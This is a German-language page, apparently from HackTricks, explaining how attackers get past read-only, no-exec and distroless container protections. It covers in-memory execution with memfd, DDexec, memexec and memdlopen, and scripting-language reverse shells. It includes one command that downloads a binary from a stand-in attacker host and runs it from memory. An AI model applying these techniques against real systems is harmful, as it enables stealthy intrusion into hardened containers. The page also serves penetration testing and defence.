# Umgehen von FS-Schutzmaßnahmen: schreibgeschützt / keine Ausführung / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Videos

In den folgenden Videos finden Sie die auf dieser Seite erwähnten Techniken ausführlicher erklärt:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## schreibgeschütztes / keine Ausführung-Szenario

Es ist immer häufiger anzutreffen, dass Linux-Maschinen mit **schreibgeschütztem (ro) Dateisystemschutz** gemountet werden, insbesondere in Containern. Das liegt daran, dass es so einfach ist, einen Container mit einem schreibgeschützten Dateisystem zu starten, indem man **`readOnlyRootFilesystem: true`** im `securitycontext` festlegt:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Allerdings wird, selbst wenn das Dateisystem als ro gemountet ist, **`/dev/shm`** weiterhin beschreibbar sein, sodass es falsch ist zu sagen, dass wir nichts auf die Festplatte schreiben können. Diese Ordner werden jedoch **mit no-exec-Schutz gemountet**, sodass Sie hier eine Binärdatei herunterladen können, aber **sie nicht ausführen können**.

> [!WARNING]
> Aus der Perspektive eines Red Teams macht dies das **Herunterladen und Ausführen** von Binärdateien, die sich nicht bereits im System befinden (wie Backdoors oder Aufzähler wie `kubectl`), **kompliziert**.

## Einfachster Umgehungsweg: Skripte

Beachten Sie, dass ich von Binärdateien gesprochen habe, Sie können **jedes Skript ausführen**, solange der Interpreter auf der Maschine vorhanden ist, wie ein **Shell-Skript**, wenn `sh` vorhanden ist, oder ein **Python**-Skript, wenn `python` installiert ist.

Allerdings reicht das nicht aus, um Ihre Binär-Backdoor oder andere Binärwerkzeuge, die Sie möglicherweise ausführen müssen, zu starten.

## Speicherumgehungen

Wenn Sie eine Binärdatei ausführen möchten, aber das Dateisystem dies nicht zulässt, ist der beste Weg, dies zu tun, indem Sie **sie aus dem Speicher ausführen**, da die **Schutzmaßnahmen dort nicht gelten**.

### FD + exec syscall Umgehung

Wenn Sie einige leistungsstarke Skript-Engines auf der Maschine haben, wie **Python**, **Perl** oder **Ruby**, könnten Sie die Binärdatei herunterladen, um sie aus dem Speicher auszuführen, sie in einem Speicher-Dateideskriptor (`create_memfd` syscall) speichern, der nicht durch diese Schutzmaßnahmen geschützt ist, und dann einen **`exec` syscall** aufrufen, der den **fd als die auszuführende Datei angibt**.

Dafür können Sie leicht das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) verwenden. Sie können ihm eine Binärdatei übergeben, und es wird ein Skript in der angegebenen Sprache generiert, das die **Binärdatei komprimiert und b64 kodiert** mit den Anweisungen zum **Dekodieren und Dekomprimieren** in einem **fd**, das durch den Aufruf des `create_memfd` syscalls erstellt wurde, und einem Aufruf des **exec** syscalls, um es auszuführen.

> [!WARNING]
> Dies funktioniert nicht in anderen Skriptsprache wie PHP oder Node, da sie keine **Standardmethode haben, um rohe syscalls** aus einem Skript aufzurufen, sodass es nicht möglich ist, `create_memfd` aufzurufen, um den **Speicher fd** zu erstellen, um die Binärdatei zu speichern.
>
> Darüber hinaus wird das Erstellen eines **regulären fd** mit einer Datei in `/dev/shm` nicht funktionieren, da Sie es nicht ausführen dürfen, da der **no-exec-Schutz** gilt.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ist eine Technik, die es Ihnen ermöglicht, **den Speicher Ihres eigenen Prozesses zu modifizieren**, indem Sie dessen **`/proc/self/mem`** überschreiben.

Daher können Sie, indem Sie **den Assembly-Code** kontrollieren, der vom Prozess ausgeführt wird, einen **Shellcode** schreiben und den Prozess "mutieren", um **beliebigen Code auszuführen**.

> [!TIP]
> **DDexec / EverythingExec** ermöglicht es Ihnen, Ihren eigenen **Shellcode** oder **jede Binärdatei** aus dem **Speicher** zu laden und **auszuführen**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Für weitere Informationen zu dieser Technik, überprüfen Sie das Github oder:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist der natürliche nächste Schritt von DDexec. Es ist ein **DDexec Shellcode-Dämon**, sodass Sie jedes Mal, wenn Sie **eine andere Binärdatei ausführen** möchten, DDexec nicht neu starten müssen. Sie können einfach den Memexec-Shellcode über die DDexec-Technik ausführen und dann **mit diesem Dämon kommunizieren, um neue Binärdateien zu laden und auszuführen**.

Sie finden ein Beispiel, wie Sie **memexec verwenden, um Binärdateien von einem PHP-Reverse-Shell auszuführen** unter [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ermöglicht die [**memdlopen**](https://github.com/arget13/memdlopen) Technik eine **einfachere Möglichkeit, Binärdateien** im Speicher zu laden, um sie später auszuführen. Es könnte sogar ermöglichen, Binärdateien mit Abhängigkeiten zu laden.

## Distroless Bypass

### Was ist distroless

Distroless-Container enthalten nur die **minimalen Komponenten, die erforderlich sind, um eine bestimmte Anwendung oder einen Dienst auszuführen**, wie Bibliotheken und Laufzeitabhängigkeiten, schließen jedoch größere Komponenten wie einen Paketmanager, eine Shell oder Systemdienstprogramme aus.

Das Ziel von Distroless-Containern ist es, die **Angriffsfläche von Containern zu reduzieren, indem unnötige Komponenten eliminiert** und die Anzahl der ausnutzbaren Schwachstellen minimiert wird.

### Reverse Shell

In einem Distroless-Container finden Sie möglicherweise **nicht einmal `sh` oder `bash`**, um eine reguläre Shell zu erhalten. Sie werden auch keine Binärdateien wie `ls`, `whoami`, `id`... finden, alles, was Sie normalerweise in einem System ausführen.

> [!WARNING]
> Daher werden Sie **nicht** in der Lage sein, eine **Reverse Shell** zu erhalten oder das System wie gewohnt zu **enumerieren**.

Wenn der kompromittierte Container jedoch beispielsweise eine Flask-Webanwendung ausführt, ist Python installiert, und daher können Sie eine **Python-Reverse-Shell** erhalten. Wenn es Node ausführt, können Sie eine Node-Reverse-Shell erhalten, und das Gleiche gilt für die meisten **Skriptsprache**.

> [!TIP]
> Mit der Skriptsprache könnten Sie das **System enumerieren**, indem Sie die Sprachfähigkeiten nutzen.

Wenn es **keine `read-only/no-exec`**-Schutzmaßnahmen gibt, könnten Sie Ihre Reverse Shell missbrauchen, um **Ihre Binärdateien im Dateisystem zu schreiben** und sie **auszuführen**.

> [!TIP]
> In dieser Art von Containern werden diese Schutzmaßnahmen jedoch normalerweise vorhanden sein, aber Sie könnten die **vorherigen Techniken zur Ausführung im Speicher verwenden, um sie zu umgehen**.

Sie finden **Beispiele**, wie Sie **einige RCE-Schwachstellen ausnutzen** können, um Skriptsprache **Reverse Shells** zu erhalten und Binärdateien aus dem Speicher auszuführen unter [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
